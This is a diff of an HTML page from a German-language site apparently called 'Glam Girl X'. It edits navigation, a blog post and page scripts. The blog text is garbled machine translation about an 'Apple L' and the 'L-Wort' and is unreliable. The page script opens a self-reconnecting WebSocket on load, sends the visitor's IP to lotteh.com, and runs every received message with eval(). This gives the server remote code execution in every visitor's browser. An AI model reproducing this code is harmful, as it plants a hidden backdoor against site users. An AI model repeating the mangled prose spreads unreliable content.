@@ -65,7 +65,7 @@
               <a class="nav-link" href="/de/landing" title="Besuchen Sie die Zielseite">Landung</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video -Chat">Chat</a>
+              <a class="nav-link" href="/de/chat" title="Video -Chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/de/private" title="Sehen Sie private Fotos mit einem Schlüssel an">Privat</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="DaisyProfilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>Von Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> Warum sollte ich beim L -Wort einen Apfel -L -OUT verwenden?Das Apple L ist ein beliebtes Streaming-Gerät, mit dem Sie Ihre bevorzugten Shows mit hochwertigem Video und Audio problemlos auf Ihre bevorzugten Shows zugreifen und sie ansehen können.Durch die Verwendung eines Apfeles im L -Wort können Sie knackige, klare Bilder und eintauchende Klang genießen, mit denen Sie sich mitten in der Aktion befinden. </P> <p> <br> </p> <p> Zusätzlich bietet das Apple L eine benutzerfreundliche Oberfläche, mit der Sie einfach durch Episoden, Pause und Rückspulen und Anpassung Ihres Betrachtungserlebnisses erleichtern können.Sie können auch Funktionen wie Sprachsuche und personalisierte Empfehlungen nutzen, damit Sie neue Inhalte für die Genehmigung ermitteln können.Bieten Sie Ihnen ein Premium -Streaming -Erlebnis, mit dem Sie sich voll in die faszinierende Welt der Show eintauchen können. </p></div>
+<div style="white-space: pre-wrap;"><p>Warum sollte ich beim L -Wort einen Apfel -L -Out verwenden?</p><p><br/></p><p>Durch die Verwendung eines Apfels L am L -Wort kann Ihr Betrachtungserlebnis auf verschiedene Weise verbessern. Das Apple L ist ein beliebtes Streaming-Gerät, mit dem Sie Ihre bevorzugten Shows mit hochwertigem Video und Audio problemlos auf Ihre bevorzugten Shows zugreifen und sie ansehen können. Durch die Verwendung eines Apfeles im L -Wort können Sie knackige, klare Grafiken und eintauchende Klang genießen, mit denen Sie sich mitten in der Aktion befinden.</p><p><br/></p><p>Darüber hinaus bietet der Apple L eine benutzerfreundliche Oberfläche, mit der Sie sich einfach durch Episoden, Pause und Rückspulen und Anpassung Ihres Betrachtungserlebnisses erleichtern können. Sie können auch Funktionen wie Sprachsuche und personalisierte Empfehlungen nutzen, um neue Inhalte zu entdecken, die Sie genießen können.</p><p><br/></p><p>Insgesamt kann es Ihnen eine Premium -Streaming -Erlebnis bieten, mit der Sie ein Apfel -L -Wort verwenden können, mit dem Sie sich vollständig in die faszinierende Welt der Show eintauchen können.</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -240,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -250,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -427,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -450,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
